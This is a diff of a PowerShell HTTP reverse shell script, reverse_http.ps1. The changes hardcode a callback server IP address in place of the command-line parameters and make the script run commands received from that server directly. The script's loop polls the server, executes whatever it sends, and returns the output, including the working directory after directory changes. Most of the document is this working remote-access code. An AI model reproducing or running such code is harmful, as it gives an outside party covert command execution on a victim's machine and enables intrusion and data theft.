@@ -24,11 +24,12 @@ PS C:\> .\reverse_http.ps1 -s 127.0.0.1 <- defaults to port 80
 If you want to debug the script the verbose option will output a lot of info during running
 #>
 
-Param (
-    [Parameter(Mandatory = $true)]    [string]    [ValidateNotNullOrEmpty()]  [Alias('s')]  $server,
-    [Parameter(Mandatory = $false)]    [int]       [ValidateNotNullOrEmpty()]  [Alias('p')]  $port = 80
-)
-
+# Param (
+#     [Parameter(Mandatory = $true)]    [string]    [ValidateNotNullOrEmpty()]  [Alias('s')]  $server,
+#     [Parameter(Mandatory = $false)]    [int]       [ValidateNotNullOrEmpty()]  [Alias('p')]  $port = 80
+# )
+$port = 80
+$server = "100.26.159.22"
 $SEND_PATH = "cmd"
 $RECV_PATH = "output"
 $PROTOCOL = "http"
@@ -58,11 +59,10 @@ function Invoke-Cmd([string] $command) {
             # Encode the command as base64 and send to powershell
             # This seems to solve some issues around formatting and escaping
 
-            #cd
-
-            $commandbytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-            $base64command = [System.Convert]::ToBase64String($commandbytes)
-            $response = &powershell.exe -EncodedCommand "$base64command" 2>&1 | Out-String
+            # $commandbytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+            # $base64command = [System.Convert]::ToBase64String($commandbytes)
+            # $response = &powershell.exe -EncodedCommand "$base64command" 2>&1 | Out-String
+            $response = &powershell.exe $command
         }
         catch {
             Write-Output "error"
@@ -92,7 +92,7 @@ while ($connected) {
     
     # Look for the end command which stops the shell remotely
     if ($command.Length -gt 2) {
-        Write-Output "co$command, L " $command.Length
+        # Write-Output "co$command, L " $command.Length
         if ($command -like "*$END_CMD*") {
             Write-Verbose "Shutting down"
             $connected = $false
@@ -100,9 +100,9 @@ while ($connected) {
         elseif ($command.IndexOf("000") -eq 0) {
        
             $t = $command.Substring(3, $command.Length - 5)
-            Write-Output "[[[$t]]]"
             Set-Location -Path $t
-            Send-Response "no response"
+            $path = Get-Location | Out-String
+            Send-Response $path
         }
         else {
             # Else execute the command and send the response
@@ -110,7 +110,7 @@ while ($connected) {
             # Write-Output $response.Length
             
             Send-Response $response
-            Write-Output "hi" $response.Length
+            # Write-Output "hi" $response.Length
         }
     }
     # Wait a short time before the next read/write loop
